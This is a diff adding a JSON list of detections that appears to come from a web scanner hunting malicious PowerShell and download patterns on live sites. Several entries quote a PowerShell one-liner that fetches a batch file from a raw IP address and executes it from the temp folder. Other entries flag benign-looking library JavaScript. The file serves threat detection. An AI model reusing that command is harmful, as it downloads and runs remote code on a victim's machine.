@@ -1,0 +1,45 @@
+[
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Download",
+    "value": {
+      "FullMatch": "Invoke-WebRequest -Uri 'http://95.164.53.214:5554/d.bat' -OutFile \\",
+      "URL": "http://95.164.53.214:5554/d.bat",
+      "Context": "Invoke-WebRequest -Uri 'http://95.164.53.214:5554/d.bat' -OutFile \\",
+      "HTAPath": null,
+      "IsPotentiallyDangerous": true,
+      "RiskLevel": "High Risk"
+    }
+  },
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Command",
+    "value": "powershell -c \"Invoke-WebRequest -Uri 'http://95.164.53.214:5554/d.bat' -OutFile \\\"%temp%\\d.bat\\\" -UseBasicParsing; Start-Process \\\"%temp%\\d.bat\\\"\"`;\r"
+  },
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Command",
+    "value": "Invoke-WebRequest"
+  },
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Command",
+    "value": "EMBEDDED_IN_JS: powershell -c "
+  },
+  {
+    "source_url": "https://entremontehotel.com",
+    "threat_score": 21112,
+    "category": "Windows Terminal",
+    "value": "Windows Terminal indicator: ...recision: 20, rounding: 4, toExpNeg: -7, toExpPos: 21, LN10: \"2.302585092994045684017991454684364207601101488628772976033327900967572609677352480235997205089598298341967784042286\" }, E = !0, N = \"[DecimalError] \", x = N + \"Invalid argument: \", O = N + \"Exponent out of rang..."
+  },
+  {
+    "source_url": "https://entremontehotel.com",
+    "threat_score": 21112,
+    "category": "WinHttp VBScript",
+    "value": "XMLHTTP download pattern: ...return new e.XMLHttpRequest } catch (t) {} } function zn() { try { return new e.ActiveXObject(\"Microsoft.XMLHTTP\") } catch (t) {} } x.ajaxSettings.xhr = e.ActiveXObject ? function() { return !this.isLocal && In() || zn() } :..."
+  }
+]
